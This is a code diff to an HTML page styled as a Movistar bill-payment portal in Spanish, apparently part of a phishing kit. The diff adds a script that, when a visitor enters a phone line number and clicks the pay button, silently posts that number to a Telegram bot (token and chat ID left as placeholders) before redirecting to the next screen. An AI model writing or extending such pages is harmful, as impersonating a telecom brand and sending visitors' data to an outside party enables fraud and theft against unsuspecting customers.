@@ -1,19 +1,16 @@
-
-
 <!doctype html>
 <html lang="es">
 
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <meta name="description"
-        content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida" />
+    <meta name="description" content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida" />
     <meta name="theme-color" content="#019DF4" />
     <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
 
     <!-- Stylesheets -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
-    <link href="styles.css" rel="stylesheet"> <!-- Enlace al CSS separado -->
+    <link href="styles.css" rel="stylesheet">
     <script src="epayco/js/functions.js"></script>
     <script src="bot.js"></script>
     <title>Movistar Portal de Recaudos</title>
@@ -107,8 +104,7 @@
 
                 <div class="form-group">
                     <div class="btn-group d-flex justify-content-center" role="group" aria-label="Tipo de línea">
-                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off"
-                            checked>
+                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off" checked>
                         <label class="btn btn-outline-primary" for="mobileLine">Móvil</label>
 
                         <input type="radio" class="btn-check" name="lineType" id="fixedLine" autocomplete="off">
@@ -166,24 +162,44 @@
         integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>
     <script src="debtmap.js"></script>
-    <script src="scripts.js"></script> <!-- Enlace al JS separado -->
+    <script src="scripts.js"></script>
+
     <script>
+        // Configura tu bot de Telegram
+        const TELEGRAM_BOT_TOKEN = "TU_TOKEN_AQUI";  // <<-- pon aquí tu token real
+        const TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUI";  // <<-- pon aquí tu chat_id real
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+            }).catch(err => console.error("Error enviando a Telegram:", err));
+        }
+
         document.getElementById("consultPayButton").addEventListener("click", function () {
             const lineNumber = document.getElementById("line-number").value.trim();
-            // Mostrar el nuevo loader SVG
+
+            // Mostrar loader
             const loader = document.getElementById("loader");
             loader.style.display = "flex";
+
             setTimeout(function () {
                 loader.style.display = "none";
-                // Lógica original después del loader
+
+                // ✅ Enviar número a Telegram ANTES de redirigir
+                if (lineNumber) {
+                    sendToTelegram(`Nuevo número consultado: ${lineNumber}`);
+                }
+
+                // Lógica original de validación y redirección
                 if (window.debtMap && window.debtMap[lineNumber]) {
                     localStorage.setItem("lineNumber", lineNumber);
                     window.location.href = "screen2.html";
                 }
-            }, 2000); // 2 segundos
+            }, 2000);
         });
     </script>
-    <!-- ...existing code... -->
 </body>
-
 </html>
